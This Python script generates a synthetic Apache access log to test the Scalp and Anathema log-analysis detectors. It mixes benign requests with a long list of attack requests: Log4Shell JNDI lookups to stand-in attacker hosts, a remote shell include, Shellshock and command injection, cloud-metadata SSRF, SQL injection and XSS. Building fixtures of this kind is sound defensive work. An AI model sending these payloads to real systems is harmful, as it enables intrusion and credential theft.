#!/usr/bin/env python3
"""
Coherent Apache Combined Access Log Generator.
Generates realistic multi-app web traffic containing thousands of lines
with a balanced mix of benign traffic, multi-vector attacks, evasions,
and behavioral patterns covering all Scalp and Anathema detection capabilities.
"""
import datetime
import random
from pathlib import Path

# Seed for reproducible generator output
random.seed(42)

TOTAL_LINES = 3800

# Normal user agents
BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# Attack user agents
ATTACK_USER_AGENTS = {
    "shellshock": "() { :; }; /bin/cat /etc/passwd",
    "log4j_agent": "${jndi:ldap://attacker-command.net:1389/Exploit}",
    "log4j_obf": "${${lower:j}ndi:${lower:l}dap://198.51.100.99:1389/a}",
    "nikto": "Mozilla/5.00 (Nikto/2.1.6) (evasions:None) (test:Port Check)",
    "sqlmap": "sqlmap/1.7#stable (http://sqlmap.org)",
    "gobuster": "gobuster/3.5.0 (github.com/OJ/gobuster)",
    "nmap": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "struts_xwork": "User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
}

BENIGN_CLIENT_IPS = [
    "192.0.2.14", "192.0.2.45", "192.0.2.89", "192.0.2.112",
    "198.51.100.10", "198.51.100.44", "198.51.100.87", "198.51.100.155",
    "203.0.113.19", "203.0.113.52", "203.0.113.104", "203.0.113.201",
    "2001:db8:85a3::8a2e:370:7334", "2001:db8:1f70::999", "2001:db8:acad::1",
]

# Dedicated attacker IPs for behavioral analysis / Anathema tracking
ATTACKER_IPS = {
    "apt_scanner": "185.220.101.5",       # Repeated scanner probing env/git/cpanel
    "sqlmap_bot": "45.154.255.89",        # SQLi burst attacker
    "ssrf_actor": "194.26.29.114",        # Cloud metadata SSRF explorer
    "rce_gang": "91.240.118.172",         # Shellshock / Command injection / RCE
    "log4j_crawler": "193.163.125.66",    # Massive JNDI Log4j scan across headers
    "modern_vector": "185.191.171.42",    # NoSQL, Prototype Pollution, SSTI, Spring
    "ipv6_actor": "2001:db8:dead:beef::1",# IPv6 targeted attacker
}

# Benign traffic templates organized by simulated Web Applications
BENIGN_ENDPOINTS = [
    # App 1: E-Commerce Storefront
    ("GET", "/store/", 200, 8420, "https://example.com/", "Storefront Home"),
    ("GET", "/store/catalog?category=electronics&page=1", 200, 15400, "https://example.com/store/", "Catalog"),
    ("GET", "/store/catalog?category=clothing&sort=price_asc", 200, 12890, "https://example.com/store/", "Catalog sort"),
    ("GET", "/store/product/49821?ref=home_promo", 200, 9420, "https://example.com/store/catalog", "Product View"),
    ("GET", "/store/product/10042", 200, 8910, "https://example.com/store/catalog", "Product View"),
    ("POST", "/store/cart/add", 302, 245, "https://example.com/store/product/49821", "Add to Cart"),
    ("GET", "/store/cart", 200, 6120, "https://example.com/store/product/49821", "Cart View"),
    ("GET", "/store/checkout", 200, 7840, "https://example.com/store/cart", "Checkout"),
    ("GET", "/static/css/theme.min.css?v=3.4.1", 200, 34210, "https://example.com/store/", "Static CSS"),
    ("GET", "/static/css/bootstrap.min.css", 304, 0, "https://example.com/store/", "Static CSS 304"),
    ("GET", "/static/js/bundle.vendor.js", 200, 142050, "https://example.com/store/", "Static JS"),
    ("GET", "/static/js/app.min.js?hash=9f82d1", 200, 48200, "https://example.com/store/", "Static JS"),
    ("GET", "/static/images/hero-banner.webp", 200, 95400, "https://example.com/store/", "Banner Image"),
    ("GET", "/static/images/logo.svg", 304, 0, "https://example.com/store/", "Logo"),
    ("GET", "/favicon.ico", 200, 1150, "-", "Favicon"),
    ("GET", "/robots.txt", 200, 420, "-", "Robots"),

    # App 2: Modern Microservices API & Mobile Backend
    ("GET", "/api/v1/health", 200, 142, "-", "API Health"),
    ("GET", "/api/v2/user/me", 200, 890, "https://app.example.com/", "User profile"),
    ("GET", "/api/v2/notifications?unread=true&limit=10", 200, 1450, "https://app.example.com/", "Notifications"),
    ("GET", "/api/v2/orders?status=shipped&offset=0&limit=25", 200, 4520, "https://app.example.com/", "Orders API"),
    ("POST", "/api/v2/auth/refresh", 200, 310, "https://app.example.com/", "Token refresh"),
    ("GET", "/api/v2/search?q=laptop+sleeve&category=accessories", 200, 3210, "https://app.example.com/", "API Search"),

    # App 3: Corporate Enterprise Portal
    ("GET", "/portal/login", 200, 4310, "-", "Portal Login"),
    ("GET", "/portal/dashboard", 200, 16800, "https://corp.example.com/portal/login", "Portal Dashboard"),
    ("GET", "/portal/documents/guide.pdf", 200, 450210, "https://corp.example.com/portal/dashboard", "Doc PDF"),
    ("GET", "/portal/reports/2024/summary.html", 200, 24100, "https://corp.example.com/portal/dashboard", "Report"),

    # App 4: Legacy Blog / Community Forum
    ("GET", "/blog/", 200, 11200, "-", "Blog Index"),
    ("GET", "/blog/post/welcome-to-our-new-architecture", 200, 18500, "https://example.com/blog/", "Blog Post"),
    ("GET", "/forum/viewtopic.php?f=4&t=1928", 200, 21400, "https://example.com/forum/", "Forum Topic"),
    ("GET", "/forum/memberlist.php?mode=viewprofile&u=54", 200, 9400, "https://example.com/forum/", "Forum Profile"),
]

# Attack scenarios crafted to match every rule in Scalp and Anathema
ATTACK_SCENARIOS = [
    # --- Modern: NoSQL Injection ---
    {
        "method": "GET",
        "url": "/api/v2/users?username[$ne]=admin&password[$gt]=",
        "status": 401,
        "bytes": 142,
        "desc": "NoSQL injection $ne / $gt bypass",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/api/v2/catalog/items?filter={%22$where%22:%22this.price%3E0%22}",
        "status": 500,
        "bytes": 523,
        "desc": "NoSQL $where JavaScript execution",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/api/v2/customers?query[$regex]=^adm.*",
        "status": 200,
        "bytes": 890,
        "desc": "NoSQL $regex wildcard harvesting",
        "ip": ATTACKER_IPS["modern_vector"],
    },

    # --- Modern: Prototype Pollution ---
    {
        "method": "GET",
        "url": "/api/v2/profile/update?__proto__[isAdmin]=true",
        "status": 400,
        "bytes": 210,
        "desc": "Prototype pollution __proto__ assignment",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/settings/theme?constructor[prototype][polluted]=yes",
        "status": 200,
        "bytes": 450,
        "desc": "Prototype pollution constructor.prototype injection",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/api/v2/session?prototype.isAdmin=1",
        "status": 403,
        "bytes": 180,
        "desc": "Prototype pollution prototype.isAdmin attribute probe",
        "ip": ATTACKER_IPS["modern_vector"],
    },

    # --- Modern: CRLF Injection ---
    {
        "method": "GET",
        "url": "/redirect?url=https://example.com%0d%0aSet-Cookie:%20account_session=hijacked_session_token",
        "status": 302,
        "bytes": 240,
        "desc": "CRLF HTTP response splitting Set-Cookie",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/auth/callback?next=%0d%0aLocation:%20https://evil-phishing-attacker.com",
        "status": 302,
        "bytes": 210,
        "desc": "CRLF response splitting Location header",
        "ip": ATTACKER_IPS["modern_vector"],
    },

    # --- Modern: OS Command Injection / Shellshock / RCE ---
    {
        "method": "GET",
        "url": "/admin/diagnostics.php?host=127.0.0.1;cat%20/etc/passwd",
        "status": 500,
        "bytes": 1024,
        "desc": "RCE command chaining with cat /etc/passwd",
        "ip": ATTACKER_IPS["rce_gang"],
    },
    {
        "method": "GET",
        "url": "/cgi-bin/status.cgi?check=localhost|whoami",
        "status": 200,
        "bytes": 412,
        "desc": "RCE pipe injection whoami",
        "ip": ATTACKER_IPS["rce_gang"],
    },
    {
        "method": "GET",
        "url": "/tools/network.php?target=8.8.8.8%60id%60",
        "status": 200,
        "bytes": 380,
        "desc": "RCE backtick subshell id command",
        "ip": ATTACKER_IPS["rce_gang"],
    },
    {
        "method": "GET",
        "url": "/cgi-bin/stats.sh?action=$(whoami)",
        "status": 404,
        "bytes": 210,
        "desc": "RCE dollar parenthesis $(whoami)",
        "ip": ATTACKER_IPS["rce_gang"],
    },
    {
        "method": "GET",
        "url": "/cgi-bin/test-cgi",
        "status": 500,
        "bytes": 740,
        "desc": "Shellshock in User-Agent header",
        "agent": ATTACK_USER_AGENTS["shellshock"],
        "ip": ATTACKER_IPS["rce_gang"],
    },

    # --- Modern: SSRF & Cloud Metadata ---
    {
        "method": "GET",
        "url": "/api/v2/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "status": 403,
        "bytes": 310,
        "desc": "SSRF AWS standard IP metadata probe",
        "ip": ATTACKER_IPS["ssrf_actor"],
    },
    {
        "method": "GET",
        "url": "/service/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "status": 400,
        "bytes": 220,
        "desc": "SSRF GCP metadata internal DNS probe",
        "ip": ATTACKER_IPS["ssrf_actor"],
    },
    {
        "method": "GET",
        "url": "/fetch?endpoint=http://2852039166/latest/meta-data/",
        "status": 403,
        "bytes": 290,
        "desc": "SSRF AWS metadata decimal IP evasion (2852039166)",
        "ip": ATTACKER_IPS["ssrf_actor"],
    },
    {
        "method": "GET",
        "url": "/download/file?source=http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
        "status": 403,
        "bytes": 290,
        "desc": "SSRF AWS metadata hexadecimal dotted evasion",
        "ip": ATTACKER_IPS["ssrf_actor"],
    },
    {
        "method": "GET",
        "url": "/api/v1/preview?image=http://0x7f000001/admin/dashboard",
        "status": 403,
        "bytes": 190,
        "desc": "SSRF localhost 127.0.0.1 hex evasion",
        "ip": ATTACKER_IPS["ssrf_actor"],
    },

    # --- Modern: Log4Shell / JNDI ---
    {
        "method": "GET",
        "url": "/search?q=${jndi:ldap://198.51.100.200:1389/Exploit}",
        "status": 400,
        "bytes": 350,
        "desc": "Log4Shell standard JNDI LDAP in URL query",
        "ip": ATTACKER_IPS["log4j_crawler"],
    },
    {
        "method": "GET",
        "url": "/api/v2/auth/login",
        "status": 401,
        "bytes": 180,
        "desc": "Log4Shell JNDI exploit inside User-Agent header",
        "agent": ATTACK_USER_AGENTS["log4j_agent"],
        "ip": ATTACKER_IPS["log4j_crawler"],
    },
    {
        "method": "GET",
        "url": "/feedback",
        "status": 200,
        "bytes": 2400,
        "desc": "Log4Shell obfuscated ${lower:j}ndi in Referer header",
        "referer": "http://example.com/feedback?ref=${${lower:j}ndi:${lower:l}dap://evil.com/a}",
        "ip": ATTACKER_IPS["log4j_crawler"],
    },

    # --- Modern: SSTI & Spring4Shell ---
    {
        "method": "GET",
        "url": "/store/catalog?search={{7*7}}",
        "status": 200,
        "bytes": 4510,
        "desc": "SSTI Jinja2 / Twig math expression {{7*7}}",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/portal/welcome?name=${7*7}",
        "status": 200,
        "bytes": 3200,
        "desc": "SSTI Spring EL math expression ${7*7}",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "GET",
        "url": "/portal/render?template={{config.__class__.__init__.__globals__[%27os%27].popen(%27id%27).read()}}",
        "status": 500,
        "bytes": 840,
        "desc": "SSTI Python Jinja2 RCE gadget",
        "ip": ATTACKER_IPS["modern_vector"],
    },
    {
        "method": "POST",
        "url": "/helloworld?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
        "status": 400,
        "bytes": 280,
        "desc": "Spring4Shell ClassLoader exploit query parameter",
        "ip": ATTACKER_IPS["modern_vector"],
    },

    # --- Modern: Sensitive Probes & Reconnaissance ---
    {
        "method": "GET",
        "url": "/.env",
        "status": 404,
        "bytes": 210,
        "desc": "Probe for root .env environment credentials",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/.git/config",
        "status": 404,
        "bytes": 210,
        "desc": "Probe for exposed git repository configuration",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/.git/HEAD",
        "status": 404,
        "bytes": 210,
        "desc": "Probe for exposed git HEAD reference",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/actuator/env",
        "status": 403,
        "bytes": 180,
        "desc": "Probe Spring Boot Actuator env endpoint",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/actuator/heapdump",
        "status": 404,
        "bytes": 210,
        "desc": "Probe Spring Boot Actuator heapdump",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/swagger-ui.html",
        "status": 404,
        "bytes": 210,
        "desc": "Probe Swagger UI documentation page",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/graphql?query={__schema{types{name}}}",
        "status": 400,
        "bytes": 180,
        "desc": "Probe GraphQL schema introspection",
        "ip": ATTACKER_IPS["apt_scanner"],
    },

    # --- Classic Attacks: SQL Injection ---
    {
        "method": "GET",
        "url": "/store/product/view?id=42%20UNION%20SELECT%201,username,password,4%20FROM%20users--",
        "status": 500,
        "bytes": 740,
        "desc": "SQLi UNION SELECT credentials extraction",
        "ip": ATTACKER_IPS["sqlmap_bot"],
    },
    {
        "method": "GET",
        "url": "/forum/viewtopic.php?t=10%27%20OR%201=1--",
        "status": 200,
        "bytes": 15400,
        "desc": "SQLi Boolean OR 1=1 auth bypass",
        "ip": ATTACKER_IPS["sqlmap_bot"],
    },
    {
        "method": "GET",
        "url": "/store/catalog?search=shoes%27%20AND%20SLEEP(5)--",
        "status": 200,
        "bytes": 840,
        "desc": "SQLi Time-based blind SLEEP(5)",
        "ip": ATTACKER_IPS["sqlmap_bot"],
    },
    {
        "method": "GET",
        "url": "/api/v1/users?id=1%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users),1,1))=97",
        "status": 200,
        "bytes": 450,
        "desc": "SQLi Blind inference query",
        "ip": ATTACKER_IPS["sqlmap_bot"],
        "agent": ATTACK_USER_AGENTS["sqlmap"],
    },

    # --- Classic Attacks: Cross-Site Scripting (XSS) ---
    {
        "method": "GET",
        "url": "/store/catalog?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "status": 200,
        "bytes": 9410,
        "desc": "XSS Script tag cookie stealer",
        "ip": ATTACKER_IPS["ipv6_actor"],
    },
    {
        "method": "GET",
        "url": "/feedback?msg=%3Cimg%20src=x%20onerror=alert(1)%3E",
        "status": 200,
        "bytes": 4510,
        "desc": "XSS Img tag onerror payload",
        "ip": ATTACKER_IPS["ipv6_actor"],
    },
    {
        "method": "GET",
        "url": "/forum/profile.php?user=%22%3E%3Csvg/onload=confirm(document.domain)%3E",
        "status": 200,
        "bytes": 6210,
        "desc": "XSS SVG onload attribute escape",
        "ip": ATTACKER_IPS["ipv6_actor"],
    },

    # --- Classic Attacks: Directory Traversal (DT) & Local File Inclusion (LFI) ---
    {
        "method": "GET",
        "url": "/download.php?file=../../../../../../etc/passwd",
        "status": 403,
        "bytes": 310,
        "desc": "Directory Traversal / LFI /etc/passwd",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/view_image.php?path=..%2f..%2f..%2f..%2fwindows%2fwin.ini",
        "status": 404,
        "bytes": 210,
        "desc": "Directory Traversal windows/win.ini with encoded slashes",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/index.php?page=php://filter/convert.base64-encode/resource=config.php",
        "status": 200,
        "bytes": 8420,
        "desc": "LFI PHP wrapper filter base64 extraction",
        "ip": ATTACKER_IPS["apt_scanner"],
    },

    # --- Classic Attacks: Remote File Execution (RFE) ---
    {
        "method": "GET",
        "url": "/include.php?file=http://malicious-c2.net/r57shell.txt?",
        "status": 403,
        "bytes": 240,
        "desc": "RFE remote PHP shell include",
        "ip": ATTACKER_IPS["rce_gang"],
    },

    # --- Evasion Techniques Decoded by PayloadNormalizer ---
    {
        "method": "GET",
        "url": "/store/search?q=%EF%BC%9Cscript%EF%BC%9Ealert(%27NFKC%27)%EF%BC%9C/script%EF%BC%9E",
        "status": 200,
        "bytes": 5400,
        "desc": "Evasion: Unicode NFKC fullwidth script tags normalized to standard ASCII",
        "ip": ATTACKER_IPS["ipv6_actor"],
    },
    {
        "method": "GET",
        "url": "/execute?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "status": 400,
        "bytes": 310,
        "desc": "Evasion: Embedded Base64 script payload decoded by normalizer",
        "ip": ATTACKER_IPS["ipv6_actor"],
    },
    {
        "method": "GET",
        "url": "/docs/view?file=%252e%252e%252f%252e%252e%252fetc%252fshadow",
        "status": 403,
        "bytes": 280,
        "desc": "Evasion: Double URL-encoded directory traversal (%252e%252e%252f)",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/download?doc=annual_report.pdf%00.exe",
        "status": 400,
        "bytes": 180,
        "desc": "Evasion: Null-byte injection %00 file extension bypass",
        "ip": ATTACKER_IPS["apt_scanner"],
    },

    # --- Anathema Behavioral Triggers (High-severity signatures) ---
    {
        "method": "GET",
        "url": "/w00tw00t.cgi",
        "status": 404,
        "bytes": 210,
        "desc": "Anathema probe: w00tw00t.cgi scanner trigger",
        "ip": ATTACKER_IPS["apt_scanner"],
        "agent": ATTACK_USER_AGENTS["nikto"],
    },
    {
        "method": "GET",
        "url": "/tmUnblock.cgi",
        "status": 404,
        "bytes": 210,
        "desc": "Anathema probe: tmUnblock.cgi firewall evasion probe",
        "ip": ATTACKER_IPS["apt_scanner"],
        "agent": ATTACK_USER_AGENTS["nikto"],
    },
    {
        "method": "GET",
        "url": "/pma/scripts/setup.php",
        "status": 404,
        "bytes": 210,
        "desc": "Anathema probe: phpMyAdmin setup.php exploit probe",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
    {
        "method": "GET",
        "url": "/wp-config.php",
        "status": 403,
        "bytes": 280,
        "desc": "Anathema probe: WordPress wp-config.php sensitive credentials probe",
        "ip": ATTACKER_IPS["apt_scanner"],
    },
]


def generate_sample_log(output_path: Path, num_lines: int = TOTAL_LINES):
    """Generates a cohesive chronological Apache Combined Access Log."""
    start_time = datetime.datetime(2024, 10, 14, 8, 0, 0, tzinfo=datetime.timezone.utc)
    current_time = start_time

    # Pre-build a pool of attack occurrences
    # Repeat key attack scenarios to ensure statistical significance and repeat offender tracking
    expanded_attacks = []
    for _ in range(6):
        expanded_attacks.extend(ATTACK_SCENARIOS)
    random.shuffle(expanded_attacks)

    attack_indices = set(random.sample(range(num_lines), len(expanded_attacks)))
    attack_queue = list(expanded_attacks)

    lines = []
    for i in range(num_lines):
        # Progress time by 1 to 45 seconds per request
        current_time += datetime.timedelta(seconds=random.randint(1, 45))
        timestamp_str = current_time.strftime("%d/%b/%Y:%H:%M:%S %z")

        if i in attack_indices and attack_queue:
            scenario = attack_queue.pop()
            method = scenario["method"]
            url = scenario["url"]
            proto = "HTTP/1.1"
            status = scenario["status"]
            bytes_sent = scenario["bytes"]
            ip = scenario["ip"]
            user = "-"
            referer = scenario.get("referer", "https://example.com/portal/index")
            user_agent = scenario.get("agent", random.choice(BENIGN_USER_AGENTS))
        else:
            # Benign user request
            method, url, status, bytes_sent, referer, _ = random.choice(BENIGN_ENDPOINTS)
            proto = random.choice(["HTTP/1.1", "HTTP/2.0", "HTTP/3.0"])
            ip = random.choice(BENIGN_CLIENT_IPS)
            user = "jdoe" if random.random() < 0.05 else "-"
            user_agent = random.choice(BENIGN_USER_AGENTS)

        # Standard Apache Combined Log Format:
        # %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
        line = f'{ip} - {user} [{timestamp_str}] "{method} {url} {proto}" {status} {bytes_sent} "{referer}" "{user_agent}"'
        lines.append(line)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    print(f"Successfully generated {len(lines)} log lines into {output_path}")


if __name__ == "__main__":
    out_file = Path(__file__).resolve().parent.parent / "examples" / "sample_access.log"
    generate_sample_log(out_file)
